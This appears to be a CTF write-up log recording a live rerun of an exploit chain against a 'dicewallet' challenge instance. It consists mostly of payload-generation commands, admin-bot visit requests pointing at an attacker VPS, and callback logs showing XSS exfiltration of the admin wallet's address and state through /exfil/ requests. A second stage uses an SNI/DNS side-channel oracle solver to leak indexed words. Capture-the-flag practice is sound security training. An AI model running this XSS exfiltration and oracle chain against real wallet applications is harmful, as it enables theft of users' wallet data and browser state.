# Live Revalidation 2026-03-09

Instance:

`https://dicewallet-cc7710666977.ctfi.ng`

VPS:

`122.218.146.XXX`

This note records the exact evidence from the March 9, 2026 rerun after the tooling cleanup.

## Status Check

Command:

```bash
curl -sk https://dicewallet-cc7710666977.ctfi.ng/status
```

Response:

```json
{"ready":true,"activeVisits":0,"maxConcurrent":3}
```

## Phase 1 Standard Run

Generated probe:

```bash
python3 exploits/generators/stage1_wallet_probe.py \
  --callback-base http://122.218.146.XXX \
  --output /tmp/z-stage1std.js
```

Visit:

```bash
curl -sk -X POST https://dicewallet-cc7710666977.ctfi.ng/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://122.218.146.XXX/payload.html?t=stage1std"}'
```

Visit response:

```json
{"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html?t=stage1std for up to 45 seconds... (1/3 active)"}
```

Callback log:

```text
[11:45:56] [XSS] {
  "d": [
    "http://localhost:8080|http://localhost:8080/admin/index.html"
  ]
}
[11:45:56] [ACCTS] {
  "d": [
    "[\"0xD4FCcfE8FEB72F3E2BAEd90c52C8e6ae49786111\"]"
  ]
}
[11:45:56] [STATE] {
  "d": [
    "{\"hasWallet\":true,\"accounts\":[{\"name\":\"Admin\",\"address\":\"0xD4FCcfE8FEB72F3E2BAEd90c52C8e6ae49786111\",\"active\":true}],\"activeIndex\":0}"
  ]
}
[11:45:56] [STAGE1_OK] {}
```

HTTP log:

```text
[2026-03-09T11:45:56Z] 34.46.155.117 - "GET /payload.html?t=stage1std HTTP/1.1" 200 -
[2026-03-09T11:45:56Z] 34.46.155.117 - code 404, message File not found
[2026-03-09T11:45:56Z] 34.46.155.117 - "GET /favicon.ico HTTP/1.1" 404 -
[2026-03-09T11:45:56Z] 34.46.155.117 - "GET /z-stage1std.js HTTP/1.1" 200 -
[2026-03-09T11:45:56Z] 34.46.155.117 - "GET /exfil/XSS?d=http%3A%2F%2Flocalhost%3A8080%7Chttp%3A%2F%2Flocalhost%3A8080%2Fadmin%2Findex.html HTTP/1.1" 200 -
[2026-03-09T11:45:56Z] 34.46.155.117 - "GET /exfil/ACCTS?d=%5B%220xD4FCcfE8FEB72F3E2BAEd90c52C8e6ae49786111%22%5D HTTP/1.1" 200 -
[2026-03-09T11:45:56Z] 34.46.155.117 - "GET /exfil/STATE?d=%7B%22hasWallet%22%3Atrue%2C%22accounts%22%3A%5B%7B%22name%22%3A%22Admin%22%2C%22address%22%3A%220xD4FCcfE8FEB72F3E2BAEd90c52C8e6ae49786111%22%2C%22active%22%3Atrue%7D%5D%2C%22activeIndex%22%3A0%7D HTTP/1.1" 200 -
[2026-03-09T11:45:56Z] 34.46.155.117 - "GET /exfil/STAGE1_OK HTTP/1.1" 200 -
```

## Phase 2 Negative Probe

Generated probe:

```bash
python3 exploits/generators/order_payload.py zoo 1 12 \
  --dns-url https://stage2negstd.122.218.146.XXX.sslip.io:1338 \
  > /tmp/z-stage2negstd.js
```

Visit:

```bash
curl -sk -X POST https://dicewallet-cc7710666977.ctfi.ng/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://122.218.146.XXX/payload.html?t=stage2negstd"}'
```

Visit response:

```json
{"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html?t=stage2negstd for up to 45 seconds... (1/3 active)"}
```

HTTP log:

```text
[2026-03-09T11:46:54Z] 34.46.155.117 - "GET /payload.html?t=stage2negstd HTTP/1.1" 200 -
[2026-03-09T11:46:54Z] 34.46.155.117 - code 404, message File not found
[2026-03-09T11:46:54Z] 34.46.155.117 - "GET /favicon.ico HTTP/1.1" 404 -
[2026-03-09T11:46:54Z] 34.46.155.117 - "GET /z-stage2negstd.js HTTP/1.1" 200 -
```

SNI log excerpt:

```text
[2026-03-09 11:46:56] connect ('34.46.155.117', 56718)
[2026-03-09 11:46:56] recv_len 1921
[2026-03-09 11:46:56] sni stage2negstd.122.218.146.XXX.sslip.io
[2026-03-09 11:46:57] connect ('34.46.155.117', 56734)
[2026-03-09 11:46:57] recv_len 1921
[2026-03-09 11:46:57] sni stage2negstd.122.218.146.XXX.sslip.io
[2026-03-09 11:46:58] connect ('34.46.155.117', 56744)
[2026-03-09 11:46:58] recv_len 1921
[2026-03-09 11:46:58] sni stage2negstd.122.218.146.XXX.sslip.io
```

## Indexed Solver Smoke Test

Wordlist:

```text
dice
zoo
```

Command:

```bash
python3 -u exploits/solvers/solve_live_sni_indexed.py \
  --base-url https://dicewallet-cc7710666977.ctfi.ng \
  --mode words \
  --group-size 2 \
  --wait 12 \
  --wordlist /tmp/test_words_stage2.txt \
  --words-file /tmp/test_words_found.txt \
  --generator-python "$(which python3)"
```

Solver output:

```text
[visit] token=r1773056875-q0001 {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html?t=r1773056875-q0001 for up to 45 seconds... (1/3 active)"}
[query_words] token=r1773056875-q0001 size=2 state={"oracle_hit": false, "z_hit": true}
[visit] token=r1773056875-q0002 {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html?t=r1773056875-q0002 for up to 45 seconds... (1/3 active)"}
[query_words] token=r1773056875-q0002 size=1 state={"oracle_hit": false, "z_hit": true}
[word] dice
[visit] token=r1773056875-q0003 {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html?t=r1773056875-q0003 for up to 45 seconds... (1/3 active)"}
[query_words] token=r1773056875-q0003 size=1 state={"oracle_hit": true, "z_hit": true}
[done] found 1 indexed candidate words -> /tmp/test_words_found.txt
```

HTTP log excerpt:

```text
[2026-03-09T11:48:10Z] 34.46.155.117 - "GET /payload.html?t=r1773056875-q0001 HTTP/1.1" 200 -
[2026-03-09T11:48:10Z] 34.46.155.117 - "GET /z-r1773056875-q0001.js HTTP/1.1" 200 -
[2026-03-09T11:48:29Z] 34.46.155.117 - "GET /payload.html?t=r1773056875-q0002 HTTP/1.1" 200 -
[2026-03-09T11:48:29Z] 34.46.155.117 - "GET /z-r1773056875-q0002.js HTTP/1.1" 200 -
[2026-03-09T11:48:50Z] 34.46.155.117 - "GET /payload.html?t=r1773056875-q0003 HTTP/1.1" 200 -
[2026-03-09T11:48:50Z] 34.46.155.117 - "GET /z-r1773056875-q0003.js HTTP/1.1" 200 -
```

Positive SNI log excerpt:

```text
[2026-03-09 11:48:54] recv_len 1926
[2026-03-09 11:48:54] sni r1773056875-q0003.122.218.146.XXX.sslip.io
[2026-03-09 11:48:55] connect ('34.46.155.117', 54642)
[2026-03-09 11:48:55] recv_len 1926
[2026-03-09 11:48:55] sni r1773056875-q0003.122.218.146.XXX.sslip.io
```

Output file:

```text
dice
```

## Summary

This rerun confirmed all three layers after the tooling cleanup:

- phase 1 HTTP callbacks on port `80`
- phase 2 negative SNI oracle on port `1338`
- the updated indexed live solver with `--generator-python`
